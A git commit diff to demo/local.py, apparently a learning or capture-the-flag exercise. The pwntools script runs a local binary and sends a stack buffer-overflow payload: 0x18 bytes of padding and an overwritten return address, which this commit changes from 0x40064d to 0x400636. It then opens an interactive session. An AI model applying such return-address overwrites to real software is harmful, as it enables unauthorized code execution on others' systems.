ae5bbfc314db53b436253edbe5b709c70e669a9b
lovenery <edittye379@gmail.com>
2017-11-19 16:27:36 +0800

    demo

--- demo/local.py
+++ demo/local.py
@@ -3,6 +3,6 @@ from pwn import *
 p = process("./a.out")
 print p.recvline()
 
-p.sendline("a"*0x18 + "\x4d\x06\x40\x00" + "\x00\x00\x00\x00")
+p.sendline("a"*0x18 + "\x36\x06\x40\x00" + "\x00\x00\x00\x00")
 
 p.interactive()
